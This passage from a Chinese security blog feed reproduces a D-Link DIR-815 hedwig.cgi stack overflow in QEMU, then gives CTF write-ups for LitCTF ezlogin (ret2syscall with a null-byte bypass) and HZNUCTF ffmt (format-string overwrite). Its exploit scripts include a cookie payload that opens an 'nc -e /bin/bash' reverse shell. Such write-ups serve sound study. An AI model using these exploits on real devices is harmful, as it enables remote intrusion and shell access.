class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>给这个 <code>init.sh</code> ，可执行权限，然后将其执行</p><p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下创建 <code>init.sh</code> 文件，写入下面的内容。给可执行权限，然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>最后进到 <code>/squashfs-root/sbin</code> 目录下，执行 <code>./httpd -f /root/squashfs-root/http_conf</code></p><p>在宿主机中访问 <code>http://10.214.140.139/hedwig.cgi</code> 发现可以正常访问了（如下）</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223749.png" alt="image-20240425215457410"></p><p>这是为了之后的打exp做准备</p><p>开启 <code>httpd</code> 服务后，如果要进行调试则需要下载一个 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">gdbserver.mipsle</a> ，然后再用 <code>scp</code> 命令将其上传到 <code>qemu</code> 中的 <code>/root/squashfs-root/</code> 目录下。</p><p>在 <code>qemu</code> 中 <code>/root/squashfs-root/</code> 目录下新建 <code>run.sh</code> 脚本（<code>IP</code> 改成宿主机的，端口）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;11&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;winmt=pwner&quot;</span>|./gdbserver.mipsle 10.214.140.140:7788 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="comment">#echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span></span><br><span class="line"><span class="built_in">unset</span> CONTENT_LENGTH</span><br><span class="line"><span class="built_in">unset</span> CONTENT_TYPE</span><br><span class="line"><span class="built_in">unset</span> HTTP_COOKIE</span><br><span class="line"><span class="built_in">unset</span> REQUEST_METHOD</span><br><span class="line"><span class="built_in">unset</span> REQUEST_URI</span><br></pre></td></tr></table></figure><p>但是这里我报了一个错误，跟ZIKH26师傅一样</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223750.png" alt="image-20240425215625540" style="zoom:50%;" /><p>ZIKH26师傅说可能是pwndbg对数据包的解析（推测</p><p>我原本的想法是将gdb整个的版本降低到对应的版本，但是因为操作问题就搁置了。。。如果有人找到解决方法希望能教一下我（本人纯菜</p><p>这里是直接运行hedwig.cgi的同时还cat &#x2F;proc&#x2F;pid&#x2F;maps得到的内存布局</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223751.png" alt="image-20240425220116640" style="zoom:50%;" /><p>但是不知道为什么我的libc版本好像跟网上的师傅有出入，导致libc基址不一样</p><p>先是<code>nv -lvnp 8888</code>，然后运行以下XP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.121.128 8888&#x27;</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x2aadc000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.121.128/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;winmt&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>但是我一直打不通，或许是libc基址的问题。。。。。因为无法调试所以就。。。。。没法子</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DIR-815&quot;&gt;&lt;a href=&quot;#DIR-815&quot; class=&quot;headerlink&quot; title=&quot;DIR-815&quot;&gt;&lt;/a&gt;DIR-815&lt;/h1&gt;&lt;p&gt;仔细研读了winmt师傅和ZIKH26师傅的复现，现在自己来复现一遍&lt;/p&gt;
&lt;h2 id=&quot;漏洞详</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>题录1.1</title>
    <link href="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/"/>
    <id>http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/</id>
    <published>2024-05-14T13:14:41.000Z</published>
    <updated>2024-05-14T13:17:32.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="刷题记录2"><a href="#刷题记录2" class="headerlink" title="刷题记录2"></a>刷题记录2</h1><h1 id="LitCTF-2023-ezlogin"><a href="#LitCTF-2023-ezlogin" class="headerlink" title="[LitCTF 2023]ezlogin"></a>[LitCTF 2023]ezlogin</h1><p>首先是符号表的恢复，将随便一个libc.so的i64文件，拖到bindiff里，然后import即可恢复大部分的函数</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuffer(off_6B97A8, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B97A0, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B9798, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !vlun(&amp;v5, <span class="number">0LL</span>, v3) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodTime.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vlun</span><span class="params">(<span class="type">int</span> v5, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">536</span>]; <span class="comment">// [rsp+0h] [rbp-218h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL) &gt; <span class="number">0x50</span>u )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  j_strcpy(*&amp;v5, v4);                           <span class="comment">// v5=v4</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v4, <span class="string">&quot;PASSWORD&quot;</span>) == <span class="number">0</span>;           <span class="comment">// 不成立</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现v5处有个栈溢出，可以实现ret2syscall</p><p>其中的限制read发现汇编</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400C07 3C 50                         cmp     al, 50h <span class="comment">; &#x27;P&#x27;</span></span><br><span class="line">.text:0000000000400C09 77 33                         ja      short loc_400C3E</span><br></pre></td></tr></table></figure><p>主要是如果al&gt;50h的话就会exit，而显然al只有一个字节8位，所以只要刚好当al&#x3D;0的时候即他的低位&lt;&#x3D;50h即可（学到了，还可以这样搞</p><p>接下来就是要思考如何绕过strcpy的\x00截断了，因为我们的rop链显然会有大量的\x00</p><p>如何绕过呢？有一个思路就是先把已经构造好的rop链将\x00都替换成A传进去，然后再一字节一字节更改位\x00</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br></pre></td></tr></table></figure><p>这个脚本主要是绕过\x00截断的，然后他是先把payload的\x00都换成A，然后将payload倒置过来，之后找到第一个\x00将其之后的，即倒置过来看就是找到最后一个\x00将其的之前所有的\x00都替换为A然后输入，之后就是从\x00之前再寻找最后一个\x00一直重复找，就可以将所有的字节输入进去辣，（使我的大脑无限旋转</p><p>之后的rop链就很简单构造了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29142)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bamboo/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Max Padding size : 0x100 - 0x150</span></span><br><span class="line"><span class="comment"># Define registers</span></span><br><span class="line">rax = <span class="number">0x4005AF</span></span><br><span class="line">rdi = <span class="number">0x400706</span></span><br><span class="line">rsi = <span class="number">0x410043</span></span><br><span class="line">rdx = <span class="number">0x448C95</span></span><br><span class="line">syscall = <span class="number">0x448D5F</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">main = <span class="number">0x4005C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create func use to replace &#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage one</span></span><br><span class="line"><span class="comment"># read(0, 0, bss)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 0代表 read</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># 0 fd</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># 此处无法填写rdx的寄存器与值，因为如果填写了会导致Payload溢出，a1寄存器为58，就会进入exit函数。</span></span><br><span class="line"><span class="comment"># 但是程序在此时的rdx值够存放很多数据，所以存放一个/bin/sh不是什么难事。</span></span><br><span class="line">debug()</span><br><span class="line">Payload = p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(bss) + p64(syscall) + p64(main)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage two</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 59代表 execve</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line"><span class="comment"># rdx 第三参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line">Payload = p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(bss) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ffmt"><a href="#HZNUCTF-2023-preliminary-ffmt" class="headerlink" title="[HZNUCTF 2023 preliminary]ffmt"></a>[HZNUCTF 2023 preliminary]ffmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115387.png" alt="image-20240512200725094"></p><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HCNUCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, hell0, please say something about yourself~&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一个格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还有一个，程序中有个backdoor，因此想的是改尾巴一个字节到backdoor，因此就能想到第一个格式化字符串漏洞泄露栈地址，然后第二个直接改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ffmt&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">25151</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your name: \n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">ret_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x140</span>+<span class="number">48</span></span><br><span class="line">leak(<span class="string">&#x27;ret_addr&#x27;</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;%35c%8$hhnaaaaaa&#x27;</span> + p64(ret_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;yourself~\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>很经典的格式化字符串漏洞</p><blockquote><p>64位格式字符串漏洞的偏移到栈上是从rsp下面一个开始的</p><ul><li>%hhn 写一字节</li><li>%hn 写两字节</li><li>%n 把已经成功输出的字符个数写入对应的整型指针参数所指的变量。将栈上的内容作为地址解析，然后改变这个地址上的内容，写四字节</li><li>%ln 32位写四字节，64位写八字节</li><li>%lln 写八字节</li></ul></blockquote><p>太久没做都着了道了</p><h1 id="de1ctf-2019-unprintable"><a href="#de1ctf-2019-unprintable" 